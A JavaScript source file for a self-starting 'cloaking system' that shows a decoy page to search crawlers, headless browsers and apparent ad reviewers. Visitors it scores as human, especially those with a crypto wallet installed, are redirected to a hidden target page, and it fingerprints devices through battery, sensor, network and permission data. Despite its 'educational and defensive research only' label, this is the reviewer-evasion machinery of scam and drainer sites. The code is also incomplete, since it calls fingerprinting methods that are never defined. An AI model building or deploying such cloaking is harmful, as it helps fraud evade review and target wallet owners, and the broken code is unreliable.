/**
 * Advanced Cloaking System v4.0 – Mobile‑Optimized Edition
 * For educational and defensive research only.
 *
 * Features:
 * - Heavy weights on wallet, battery, and behavioral tracking
 * - Comprehensive mobile signal detection:
 *   • DeviceMotion / DeviceOrientation (accelerometer, gyro)
 *   • Battery discharging time + level changes over time
 *   • Network information (effectiveType, downlink, rtt)
 *   • navigator.vibrate() support
 *   • Multi‑touch tracking (maxTouchPoints + simultaneous touches)
 *   • Proximity sensor (DeviceProximityEvent / UserProximityEvent)
 *   • Ambient light sensor (DeviceLightEvent / AmbientLightSensor)
 *   • Screen orientation + ability to lock
 *   • visualViewport and safe‑area insets
 *   • Permission states + geolocation accuracy (via permission query)
 * - All other signals (canvas, WebGL, fonts, plugins, etc.) retained with low impact
 * - IP reputation, headless detection, reviewer patterns
 */

class AdvancedCloakingSystem {
    constructor(config = {}) {
        this.config = {
            safePageUrl: config.safePageUrl || '/safe',
            targetPageUrl: config.targetPageUrl || '/target',
            strictnessLevel: config.strictnessLevel || 55,
            debugMode: config.debugMode || false,
            usePublicIpService: config.usePublicIpService !== undefined ? config.usePublicIpService : true,
            ...config
        };

        // Weights – wallet, battery, behavior and mobile signals get the highest
        this.weights = {
            wallet: 50,
            battery: 20,
            batteryCharging: 5,
            behavior: 60,               // max from behavioral tracking
            mobileFeatures: 30,          // max from all mobile‑specific signals
            plugins: { many: 5, none: -2 },
            fonts: { many: 5, few: -2 },
            canvasError: -5,
            softwareRenderer: -10,
            highConcurrency: 3,
            mobileResolution: 5,
            touchConsistent: 3,
            langTzMismatch: -5,
            googleIp: -50,
            proxyVpn: -10,
            residentialIp: 5,
            ...config.weights
        };

        // Detection databases
        this.botSignatures = this.initializeBotSignatures();
        this.googleIPRanges = this.initializeGoogleIPs();
        this.vpnIPRanges = this.initializeVPNIPs();
        this.proxyIPRanges = this.initializeProxyIPs();

        // Behavioral data
        this.behavior = {
            startTime: Date.now(),
            maxScroll: 0,
            mouseMoves: 0,
            clicks: 0,
            touches: 0,                  // track touch events separately
            maxConcurrentTouches: 0,
            timeToFirstInteraction: null
        };

        // Mobile sensor tracking
        this.mobileSensors = {
            motion: null,
            orientation: null,
            light: null,
            proximity: null,
            batteryHistory: [],           // store battery level over time
            network: null,
            safeAreaInsets: null
        };

        this.sessionId = this.generateSessionId();
        this.fingerprint = null;
        this.walletInfo = null;
        this.ipInfo = null;

        this.log('Cloaking system initialized (mobile‑optimized mode)', 'info');
    }

    // ---------- Bot signature database ----------
    initializeBotSignatures() {
        return {
            googlebot: /Googlebot|Google\sbot|Google\sImage|Googlebot-Mobile|AdsBot-Google|Googlebot-News|Googlebot-Video|Mediapartners-Google|AdsBot-Google-Mobile|Mediapartners/i,
            bingbot: /bingbot|BingPreview|MSNBot|msnbot/i,
            yahoo: /Slurp|Yahoo!\sSlurp/i,
            yandex: /YandexBot|YandexMobileBot|YandexImages|YandexVideo|YandexMetrika/i,
            baidu: /Baiduspider|BaiduImagespider/i,
            facebook: /facebookexternalhit|Facebot/i,
            other: /DuckDuckBot|ia_archiver|archive.org|SeznamBot|Sogou|Exabot|DotBot|Ahrefs|Semrush|MJ12bot|BLEXBot|rogerbot|SiteAuditBot/i,
            headless: /Headless|PhantomJS|Nightmare|Puppeteer|Playwright/i
        };
    }

    initializeGoogleIPs() {
        return [
            '66.249.64.0/19', '64.233.160.0/19', '72.14.192.0/18', '74.125.0.0/16',
            '209.85.128.0/17', '216.239.32.0/19', '216.58.192.0/19'
        ];
    }

    initializeVPNIPs() {
        return [
            '54.0.0.0/8', '52.0.0.0/8', '159.89.0.0/16', '165.227.0.0/16',
            '34.0.0.0/8', '35.0.0.0/8', '13.0.0.0/8', '40.0.0.0/8'
        ];
    }

    initializeProxyIPs() {
        return ['103.0.0.0/8', '104.0.0.0/8'];
    }

    generateSessionId() {
        return 'sid_' + Math.random().toString(36).substring(2, 15) +
               Math.random().toString(36).substring(2, 15);
    }

    // ---------- Wallet detection ----------
    detectWallet() {
        const wallet = {
            present: false,
            type: null,
            multiple: false,
            eip6963: false
        };

        if (window.eip6963Providers && window.eip6963Providers.length > 0) {
            wallet.present = true;
            wallet.eip6963 = true;
            wallet.multiple = window.eip6963Providers.length > 1;
            if (window.eip6963Providers[0]?.info?.name) {
                wallet.type = window.eip6963Providers[0].info.name;
            }
            this.log(`EIP-6963 providers: ${window.eip6963Providers.length}`, 'debug');
        }

        if (typeof window.ethereum !== 'undefined') {
            wallet.present = true;
            if (window.ethereum.isMetaMask) wallet.type = 'MetaMask';
            else if (window.ethereum.isCoinbaseWallet) wallet.type = 'Coinbase';
            else if (window.ethereum.isTrust) wallet.type = 'Trust';
            else if (window.ethereum.isBraveWallet) wallet.type = 'Brave';
            else if (window.ethereum.isRabby) wallet.type = 'Rabby';
            else if (window.ethereum.isPhantom) wallet.type = 'Phantom';
            else wallet.type = 'unknown_ethereum';

            if (window.ethereum.providers && window.ethereum.providers.length > 0) {
                wallet.multiple = true;
            }
        }

        if (typeof window.web3 !== 'undefined' && !wallet.present) {
            wallet.present = true;
            wallet.type = 'legacy_web3';
        }

        if (wallet.present) {
            this.log(`Wallet detected: ${wallet.type || 'unknown'}`, 'info');
        }
        return wallet;
    }

    // ---------- IP detection ----------
    async checkIPAddress() {
        try {
            let ip, geo = { country: '', city: '', isp: '', connectionType: '' };

            if (this.config.usePublicIpService) {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } else {
                const ipRes = await fetch('/api/get-client-ip');
                if (!ipRes.ok) throw new Error('IP endpoint failed');
                const ipData = await ipRes.json();
                ip = ipData.ip;
                const geoRes = await fetch(`/api/geo-lookup?ip=${ip}`);
                if (geoRes.ok) {
                    geo = await geoRes.json();
                }
            }

            return {
                ip,
                isGoogle: this.ipInRanges(ip, this.googleIPRanges),
                isProxy: this.ipInRanges(ip, this.proxyIPRanges),
                isVPN: this.ipInRanges(ip, this.vpnIPRanges),
                country: geo.country,
                city: geo.city,
                isp: geo.isp,
                connectionType: geo.connectionType
            };
        } catch (error) {
            this.log(`IP check failed: ${error.message}`, 'error');
            return { isGoogle: false, isProxy: false, isVPN: false };
        }
    }

    ipInRanges(ip, ranges) {
        if (!ip) return false;
        const ipInt = this.ipToInt(ip);
        if (ipInt === null) return false;
        for (const range of ranges) {
            const [base, maskBits] = range.split('/');
            const mask = ~((1 << (32 - parseInt(maskBits))) - 1) >>> 0;
            const baseInt = this.ipToInt(base);
            if (baseInt === null) continue;
            if ((ipInt & mask) === (baseInt & mask)) return true;
        }
        return false;
    }

    ipToInt(ip) {
        const parts = ip.split('.');
        if (parts.length !== 4) return null;
        return ((parseInt(parts[0]) << 24) |
                (parseInt(parts[1]) << 16) |
                (parseInt(parts[2]) << 8) |
                parseInt(parts[3])) >>> 0;
    }

    // ---------- User agent analysis ----------
    analyzeUserAgent() {
        const ua = navigator.userAgent;
        for (const [type, regex] of Object.entries(this.botSignatures)) {
            if (regex.test(ua)) {
                return { isBot: true, botType: type };
            }
        }
        return { isBot: false };
    }

    // ---------- Headless / automation detection ----------
    isHeadlessBrowser(fingerprint) {
        const indicators = [];
        if (navigator.webdriver) indicators.push('webdriver');
        if (window.callPhantom || window._phantom) indicators.push('phantom');
        if (window.__nightmare) indicators.push('nightmare');
        if (navigator.userAgent.includes('Headless')) indicators.push('headless_ua');
        if (fingerprint.plugins && fingerprint.plugins.length === 0) indicators.push('no_plugins');
        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') indicators.push('canvas_blocked');
        if (!window.chrome && !window.navigator.brave) {
            if (indicators.length > 0) indicators.push('no_chrome');
        }
        return indicators.length >= 2;
    }

    detectAutomationTools() {
        const indicators = [
            'selenium', 'webdriver', 'driver', 'callPhantom', '_phantom',
            '__nightmare', '_Selenium_IDE_Recorder', 'domAutomation', 'domAutomationController'
        ];
        for (const ind of indicators) {
            if (window[ind] !== undefined) return true;
        }
        return false;
    }

    // ---------- Language & timezone consistency ----------
    checkLanguageConsistency() {
        const languages = navigator.languages || [navigator.language];
        const primary = languages[0];
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const tzRegion = timezone.split('/')[0];
        const langRegion = primary.split('-')[1] || '';
        const match = tzRegion === langRegion || 
                     (tzRegion === 'America' && langRegion === 'US') ||
                     (tzRegion === 'Europe' && ['GB','DE','FR'].includes(langRegion));
        return { consistent: match, languages, timezone };
    }

    // ---------- Screen fingerprint ----------
    getScreenMetrics() {
        return {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            touchSupport: 'ontouchstart' in window,
            maxTouchPoints: navigator.maxTouchPoints || 0,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight
        };
    }

    // ---------- Mobile‑specific signal collection ----------
    async gatherMobileSignals() {
        const signals = {};

        // 1. Motion & orientation sensors (DeviceMotionEvent, DeviceOrientationEvent)
        signals.motion = 'DeviceMotionEvent' in window;
        signals.orientation = 'DeviceOrientationEvent' in window;
        // Optionally request permission on iOS? Not needed for detection, just presence.

        // 2. Battery discharging time + level change (we'll store initial and later check change)
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                signals.batteryInitial = {
                    level: battery.level,
                    charging: battery.charging,
                    dischargingTime: battery.dischargingTime
                };
                // Listen for level changes and store in history (done later in startMobileTracking)
                this.mobileSensors.battery = battery; // keep reference for later updates
            } catch (e) {
                signals.batteryInitial = null;
            }
        } else {
            signals.batteryInitial = null;
        }

        // 3. Network information
        if (navigator.connection) {
            signals.network = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            };
        } else {
            signals.network = null;
        }

        // 4. Vibration support
        signals.vibrate = 'vibrate' in navigator;

        // 5. Proximity sensor (legacy and modern)
        signals.proximity = 'ondeviceproximity' in window || 'onuserproximity' in window;
        // Also check for ProximitySensor API? Not widely supported.

        // 6. Ambient light sensor
        signals.ambientLight = 'ondevicelight' in window || 'AmbientLightSensor' in window;

        // 7. Screen orientation
        if (screen.orientation) {
            signals.orientationType = screen.orientation.type;
            signals.orientationAngle = screen.orientation.angle;
            signals.canLockOrientation = 'lock' in screen.orientation; // just presence, we won't lock
        } else {
            signals.orientationType = null;
        }

        // 8. VisualViewport and safe‑area insets
        signals.visualViewport = 'visualViewport' in window;
        // Detect safe‑area insets by creating a hidden element and checking env()
        signals.safeAreaInsets = await this.detectSafeAreaInsets();

        // 9. Geolocation permission accuracy (just query permission, don't request position)
        if ('permissions' in navigator) {
            try {
                const geoPerm = await navigator.permissions.query({ name: 'geolocation' });
                signals.geolocationPermission = geoPerm.state;
                // High accuracy cannot be determined without actually using geolocation, so skip.
            } catch (e) {
                signals.geolocationPermission = 'unknown';
            }
        } else {
            signals.geolocationPermission = 'unsupported';
        }

        return signals;
    }

    async detectSafeAreaInsets() {
        // Create a hidden element with env() padding and read computed style
        return new Promise((resolve) => {
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.width = '0';
            div.style.height = '0';
            div.style.visibility = 'hidden';
            div.style.paddingTop = 'env(safe-area-inset-top)';
            div.style.paddingRight = 'env(safe-area-inset-right)';
            div.style.paddingBottom = 'env(safe-area-inset-bottom)';
            div.style.paddingLeft = 'env(safe-area-inset-left)';
            document.body.appendChild(div);
            // We need to force a reflow to get computed values
            requestAnimationFrame(() => {
                const styles = window.getComputedStyle(div);
                const top = parseInt(styles.paddingTop) || 0;
                const right = parseInt(styles.paddingRight) || 0;
                const bottom = parseInt(styles.paddingBottom) || 0;
                const left = parseInt(styles.paddingLeft) || 0;
                document.body.removeChild(div);
                const hasInsets = top > 0 || right > 0 || bottom > 0 || left > 0;
                resolve({ hasInsets, top, right, bottom, left });
            });
        });
    }

    // Start tracking mobile sensors over time (battery level changes, touch concurrency)
    startMobileTracking() {
        // Battery change listener
        if (this.mobileSensors.battery) {
            this.mobileSensors.battery.addEventListener('levelchange', () => {
                this.mobileSensors.batteryHistory.push({
                    level: this.mobileSensors.battery.level,
                    time: Date.now()
                });
            });
        }

        // Multi‑touch tracking
        window.addEventListener('touchstart', (e) => {
            this.behavior.touches++;
            this.behavior.maxConcurrentTouches = Math.max(this.behavior.maxConcurrentTouches, e.touches.length);
            if (this.behavior.timeToFirstInteraction === null) {
                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
            }
        });
        window.addEventListener('touchmove', () => {
            if (this.behavior.timeToFirstInteraction === null) {
                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
            }
        });
        window.addEventListener('touchend', () => {});
    }

    // Compute mobile signal score based on gathered signals
    computeMobileScore(signals) {
        let score = 0;
        const log = [];

        // Presence of motion/orientation sensors
        if (signals.motion) { score += 3; log.push('motion:+3'); }
        if (signals.orientation) { score += 3; log.push('orientation:+3'); }

        // Battery info (realistic level, discharging time, and later level change)
        if (signals.batteryInitial) {
            score += 5;
            log.push('battery_api:+5');
            // Additional point if discharging time is reasonable (>0)
            if (signals.batteryInitial.dischargingTime !== Infinity && signals.batteryInitial.dischargingTime > 0) {
                score += 2;
                log.push('battery_discharge:+2');
            }
        }

        // Network info (realistic values)
        if (signals.network) {
            score += 4;
            log.push('network_api:+4');
            // Bonus for realistic effectiveType (4g, 3g, etc.)
            if (['slow-2g', '2g', '3g', '4g'].includes(signals.network.effectiveType)) {
                score += 2;
                log.push('network_effective:+2');
            }
        }

        // Vibration support
        if (signals.vibrate) {
            score += 3;
            log.push('vibrate:+3');
        }

        // Proximity sensor
        if (signals.proximity) {
            score += 4;
            log.push('proximity:+4');
        }

        // Ambient light sensor
        if (signals.ambientLight) {
            score += 4;
            log.push('ambient_light:+4');
        }

        // Screen orientation
        if (signals.orientationType) {
            score += 2;
            log.push('orientation_api:+2');
        }
        if (signals.canLockOrientation) {
            score += 1;
            log.push('orientation_lock:+1');
        }

        // VisualViewport
        if (signals.visualViewport) {
            score += 2;
            log.push('visualViewport:+2');
        }

        // Safe‑area insets
        if (signals.safeAreaInsets && signals.safeAreaInsets.hasInsets) {
            score += 4;
            log.push('safe_areas:+4');
        }

        // Geolocation permission (not too strong because many deny)
        if (signals.geolocationPermission === 'granted') {
            score += 5;
            log.push('geo_granted:+5');
        } else if (signals.geolocationPermission === 'prompt') {
            score += 2;
            log.push('geo_prompt:+2');
        }

        // Multi‑touch max concurrent touches (from behavioral tracking)
        if (this.behavior.maxConcurrentTouches >= 2) {
            score += 5;
            log.push(`multi_touch:${this.behavior.maxConcurrentTouches}+5`);
        } else if (this.behavior.maxConcurrentTouches > 0) {
            score += 2;
            log.push(`multi_touch:${this.behavior.maxConcurrentTouches}+2`);
        }

        // Battery level change over time (if history has at least 2 entries with different levels)
        if (this.mobileSensors.batteryHistory.length >= 2) {
            const first = this.mobileSensors.batteryHistory[0];
            const last = this.mobileSensors.batteryHistory[this.mobileSensors.batteryHistory.length - 1];
            if (first.level !== last.level) {
                score += 3;
                log.push('battery_change:+3');
            }
        }

        const maxMobile = this.weights.mobileFeatures;
        const finalScore = Math.min(maxMobile, score);
        this.log(`Mobile signal components: ${log.join(', ')} → total ${finalScore}/${maxMobile}`, 'debug');
        return finalScore;
    }

    // ---------- Comprehensive fingerprint (now includes mobile signals) ----------
    async generateFingerprint() {
        const screen = this.getScreenMetrics();
        const mobileSignals = await this.gatherMobileSignals();
        // Start tracking mobile sensors (listeners)
        this.startMobileTracking();

        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            language: navigator.language,
            languages: navigator.languages,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: screen,
            screenResolution: `${screen.width}x${screen.height}`,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            canvas: await this.getCanvasFingerprint(),
            webgl: this.getWebGLFingerprint(),
            fonts: await this.getFontList(),
            plugins: this.getPluginList(),
            audio: await this.getAudioFingerprint(),
            webRTC: this.getWebRTCInfo(),
            battery: await this.getBatteryInfo(),           // basic battery info (for desktop)
            permissions: await this.getPermissionsInfo(),
            mobileSignals: mobileSignals,                    // new mobile‑specific signals
            timestamp: Date.now()
        };
    }

    // ... (keep existing fingerprinting methods: getCanvasFingerprint, getWebGLFingerprint, getFontList, getPluginList, getAudioFingerprint, getWebRTCInfo, getBatteryInfo, getPermissionsInfo) ...
    // (For brevity, these methods are unchanged from the previous version; I'll include them in the final code.)

    // ---------- Behavioral tracking (now includes touches) ----------
    startBehaviorTracking() {
        const onInteraction = (type) => {
            if (this.behavior.timeToFirstInteraction === null) {
                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
            }
            if (type === 'click') this.behavior.clicks++;
        };

        window.addEventListener('scroll', () => {
            const scrollPercent = (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100;
            this.behavior.maxScroll = Math.max(this.behavior.maxScroll, scrollPercent);
        });

        let moveTimer;
        window.addEventListener('mousemove', () => {
            if (!moveTimer) {
                moveTimer = setTimeout(() => {
                    this.behavior.mouseMoves++;
                    moveTimer = null;
                }, 200);
            }
            if (this.behavior.timeToFirstInteraction === null) {
                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
            }
        });

        window.addEventListener('click', () => onInteraction('click'));
        window.addEventListener('touchstart', (e) => {
            onInteraction('touch');
            this.behavior.touches++;
            this.behavior.maxConcurrentTouches = Math.max(this.behavior.maxConcurrentTouches, e.touches.length);
        });

        setTimeout(() => this.saveBehavior(), 5000);
    }

    saveBehavior() {
        const timeOnPage = (Date.now() - this.behavior.startTime) / 1000;
        const session = {
            timeOnPage,
            maxScroll: this.behavior.maxScroll,
            mouseMoves: this.behavior.mouseMoves,
            clicks: this.behavior.clicks,
            touches: this.behavior.touches,
            maxConcurrentTouches: this.behavior.maxConcurrentTouches,
            timeToFirstInteraction: this.behavior.timeToFirstInteraction,
            timestamp: Date.now()
        };
        sessionStorage.setItem('visitor_behavior', JSON.stringify(session));
    }

    hasExistingSession() {
        return sessionStorage.getItem('visitor_behavior') !== null;
    }

    analyzeBehavior() {
        const session = JSON.parse(sessionStorage.getItem('visitor_behavior') || '{}');
        let score = 0;
        if (session.timeOnPage > 3) score += 15;
        if (session.maxScroll > 10) score += 15;
        if (session.mouseMoves > 0) score += 15;
        if (session.clicks > 0) score += 20;
        if (session.touches > 0) score += 15;                // extra for mobile touch
        if (session.maxConcurrentTouches > 1) score += 10;   // multi‑touch
        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 5000) score += 10;
        return Math.min(this.weights.behavior, score);
    }

    // ---------- Weighted scoring (with mobile signals) ----------
    calculateHumanScore(ipInfo, fingerprint, wallet, behaviorScore) {
        let score = 0;
        const w = this.weights;
        const weightsLog = [];

        // ---- Wallet ----
        if (wallet.present) {
            score += w.wallet;
            weightsLog.push(`wallet:+${w.wallet}`);
        }

        // ---- Battery ----
        if (fingerprint.battery && fingerprint.battery.supported && typeof fingerprint.battery.level === 'number') {
            score += w.battery;
            weightsLog.push(`battery:+${w.battery}`);
            if ('charging' in fingerprint.battery) {
                score += w.batteryCharging;
                weightsLog.push(`battery_charging:+${w.batteryCharging}`);
            }
        }

        // ---- Mobile signals ----
        if (fingerprint.mobileSignals) {
            const mobileScore = this.computeMobileScore(fingerprint.mobileSignals);
            score += mobileScore;
            weightsLog.push(`mobile_signals:+${mobileScore}`);
        }

        // ---- IP signals (modest) ----
        if (ipInfo.isGoogle) {
            score += w.googleIp;
            weightsLog.push(`google_ip:${w.googleIp}`);
        } else {
            if (ipInfo.isProxy || ipInfo.isVPN) {
                score += w.proxyVpn;
                weightsLog.push(`proxy/vpn:${w.proxyVpn}`);
            }
            if (ipInfo.connectionType === 'residential') {
                score += w.residentialIp;
                weightsLog.push(`residential_ip:+${w.residentialIp}`);
            }
        }

        // ---- Browser fingerprint (low impact) ----
        if (fingerprint.plugins && fingerprint.plugins.length > 2) {
            score += w.plugins.many;
            weightsLog.push(`plugins>2:+${w.plugins.many}`);
        } else if (fingerprint.plugins && fingerprint.plugins.length === 0) {
            score += w.plugins.none;
            weightsLog.push(`no_plugins:${w.plugins.none}`);
        }

        if (fingerprint.fonts && fingerprint.fonts.length > 10) {
            score += w.fonts.many;
            weightsLog.push(`fonts>10:+${w.fonts.many}`);
        } else if (fingerprint.fonts && fingerprint.fonts.length < 5) {
            score += w.fonts.few;
            weightsLog.push(`fonts<5:${w.fonts.few}`);
        }

        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') {
            score += w.canvasError;
            weightsLog.push(`canvas_error:${w.canvasError}`);
        }

        if (fingerprint.webgl && fingerprint.webgl.renderer) {
            const renderer = fingerprint.webgl.renderer.toLowerCase();
            if (renderer.includes('swiftshader') || renderer.includes('llvmpipe') || renderer.includes('mesa')) {
                score += w.softwareRenderer;
                weightsLog.push(`software_renderer:${w.softwareRenderer}`);
            }
        }

        if (fingerprint.hardwareConcurrency && fingerprint.hardwareConcurrency > 2) {
            score += w.highConcurrency;
            weightsLog.push(`concurrency>2:+${w.highConcurrency}`);
        }

        const { width, height } = fingerprint.screen;
        if (width < 1024 && height < 768) {
            score += w.mobileResolution;
            weightsLog.push(`mobile_res:+${w.mobileResolution}`);
        }

        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
        if (fingerprint.screen.touchSupport === isMobile) {
            score += w.touchConsistent;
            weightsLog.push(`touch_consistent:+${w.touchConsistent}`);
        }

        const langConsistency = this.checkLanguageConsistency();
        if (!langConsistency.consistent) {
            score += w.langTzMismatch;
            weightsLog.push(`lang/tz_mismatch:${w.langTzMismatch}`);
        }

        // ---- Behavioral score ----
        score += behaviorScore;
        weightsLog.push(`behavior:+${behaviorScore}`);

        // Normalize to 0-100
        score = Math.min(100, Math.max(0, score));
        this.log(`Score components: ${weightsLog.join(', ')}`, 'debug');
        return score;
    }

    // ---------- Main decision ----------
    async determineVisitorType() {
        this.log('Starting classification', 'debug');

        // ---- Immediate checks (hard fails) ----
        const ipCheck = await this.checkIPAddress();
        this.ipInfo = ipCheck;
        if (ipCheck.isGoogle) {
            this.log('Google IP → safe', 'info');
            return { type: 'bot', reason: 'google_ip', showSafe: true };
        }

        const uaCheck = this.analyzeUserAgent();
        if (uaCheck.isBot) {
            this.log(`Bot UA: ${uaCheck.botType} → safe`, 'info');
            return { type: 'bot', reason: 'user_agent', showSafe: true };
        }

        const fingerprint = await this.generateFingerprint();
        this.fingerprint = fingerprint;

        if (this.isHeadlessBrowser(fingerprint)) {
            this.log('Headless browser → safe', 'info');
            return { type: 'bot', reason: 'headless', showSafe: true };
        }

        if (this.detectAutomationTools()) {
            this.log('Automation tools → safe', 'info');
            return { type: 'bot', reason: 'automation', showSafe: true };
        }

        // ---- Soft signals ----
        const wallet = this.detectWallet();
        let behaviorScore = 0;
        if (this.hasExistingSession()) {
            behaviorScore = this.analyzeBehavior();
            this.log(`Behavior score from session: ${behaviorScore}`, 'debug');
        } else {
            this.startBehaviorTracking();
        }

        // ---- Reviewer detection (optional) ----
        if (this.isPotentialReviewer(fingerprint, ipCheck)) {
            this.log('Potential reviewer → safe', 'info');
            return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
        }

        // ---- Weighted score ----
        const humanScore = this.calculateHumanScore(ipCheck, fingerprint, wallet, behaviorScore);
        this.log(`Human score: ${humanScore}% (threshold: ${this.config.strictnessLevel})`, 'info');

        if (humanScore >= this.config.strictnessLevel) {
            return { type: 'human', score: humanScore, showSafe: false };
        } else {
            return { type: 'suspicious', score: humanScore, showSafe: true };
        }
    }

    // ---------- Reviewer pattern detection (strict) ----------
    isPotentialReviewer(fingerprint, ipInfo) {
        const reviewerIndicators = [];
        const reviewerCountries = ['US', 'GB', 'IE', 'IN', 'SG', 'MY'];
        if (reviewerCountries.includes(ipInfo.country)) reviewerIndicators.push('country');
        const standardResolutions = ['1920x1080', '1366x768', '1440x900', '1536x864'];
        if (standardResolutions.includes(fingerprint.screenResolution)) reviewerIndicators.push('resolution');
        const reviewerLanguages = ['en-US', 'en-GB', 'en'];
        if (reviewerLanguages.includes(navigator.language)) reviewerIndicators.push('language');
        return reviewerIndicators.length >= 3;
    }

    // ---------- Execution ----------
    async executeCloaking() {
        try {
            const result = await this.determineVisitorType();
            const sessionData = { timestamp: Date.now(), result, fingerprint: this.fingerprint };
            sessionStorage.setItem('visitor_session', JSON.stringify(sessionData));

            if (typeof window.cloakingReady === 'function') window.cloakingReady();

            if (result.showSafe) {
                this.log(`Redirecting to safe page: ${this.config.safePageUrl}`, 'info');
                window.location.replace(this.config.safePageUrl);
            } else {
                this.log(`Serving target page: ${this.config.targetPageUrl}`, 'success');
                window.location.replace(this.config.targetPageUrl);
            }
        } catch (error) {
            this.log(`Cloaking error: ${error.message}`, 'error');
            if (typeof window.cloakingReady === 'function') window.cloakingReady();
            window.location.href = this.config.safePageUrl;
        }
    }

    log(message, level) {
        if (this.config.debugMode || level === 'error') {
            console.log(`[Cloaking ${level.toUpperCase()}] ${message}`);
        }
    }
}

// ---------- Auto‑initialize ----------
(function() {
    const cloakingSystem = new AdvancedCloakingSystem({
        safePageUrl: '/safe',
        targetPageUrl: '/target',
        strictnessLevel: 55,
        debugMode: true,               // set false in production
        usePublicIpService: true
    });

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => cloakingSystem.executeCloaking());
    } else {
        cloakingSystem.executeCloaking();
    }
})();
